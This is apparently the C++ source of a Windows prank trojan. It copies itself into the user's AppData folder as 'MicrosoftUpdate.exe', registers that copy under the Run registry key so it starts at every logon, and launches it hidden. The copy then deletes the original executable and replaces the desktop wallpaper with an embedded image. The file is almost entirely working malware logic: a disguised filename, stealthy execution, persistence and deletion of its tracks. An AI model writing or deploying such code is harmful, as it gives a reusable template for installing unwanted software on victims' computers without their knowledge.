

#include "Windows.h"
#include "atlstr.h"
#include <iostream>
#include <fstream>
#include <vector>
#include "data.h"

#define RELEASE 1

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}


void RegisterProgram(WCHAR* path)
{
//	wchar_t szPathToExe[MAX_PATH];

//	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	RegisterMyProgramForStartup(L"Toby", path, L"-kek");
}

void copyApplicationToLocation(TCHAR* path){
	TCHAR buf[MAX_PATH];
	GetModuleFileName(0, buf, MAX_PATH);
	CopyFile(buf, path, TRUE);
}

std::string utf8_encode(const std::wstring &wstr)
{
	if (wstr.empty()) return std::string();
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
	std::string strTo( size_needed, 0 );
	WideCharToMultiByte                  (CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
	return strTo;
}

std::wstring utf8_decode(const std::string &str)
{
	if( str.empty() ) return std::wstring();
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
	std::wstring wstrTo(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
	return wstrTo;
}

#if RELEASE
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
#else
int wmain(int argc, wchar_t ** argv){
#endif

	std::wcout << "Hello, Toby" << std::endl;

#if RELEASE
	LPWSTR* argv;
	int argc;

	argv = CommandLineToArgvW(GetCommandLine(), &argc);


	WCHAR* appdata = _wgetenv(L"APPDATA");
	TCHAR out[MAX_PATH];
	_stprintf(out, L"%s\\MicrosoftUpdate.exe", appdata);


#endif


	if (argc == 2){

		if (PathFileExists(argv[1]))
			DeleteFile(argv[1]);
	
		Sleep(2000);

		std::ofstream output("output.jpg", std::ofstream::binary);
		output.write(data, 16513);
		output.close();
		
		TCHAR pic[MAX_PATH];
		_stprintf(pic, L"%s\\output.jpg", appdata);

		Sleep(2000);

		SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, pic, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);



	}else{

		std::wcout << "deleting " << out << " ..." << std::flush;
		DeleteFile(out);
		std::wcout << "done" << std::endl;

		std::wcout << "copying to  " << getenv("APPDATA") << " ..." << std::flush;
		copyApplicationToLocation(out);
		std::wcout << "done" << std::endl;

		std::wcout << "Registering program... " << std::flush;
		RegisterProgram(out);
		std::wcout << "done" << std::endl;

		std::wcout << "Starting " << out << " " << argv[0] << " ... " << std::flush;
		HINSTANCE err = ShellExecute(0, _T("open"), out, argv[0], 0, SW_HIDE);
		std::wcout << "done" << std::endl;

	}
	
	return 0;
}


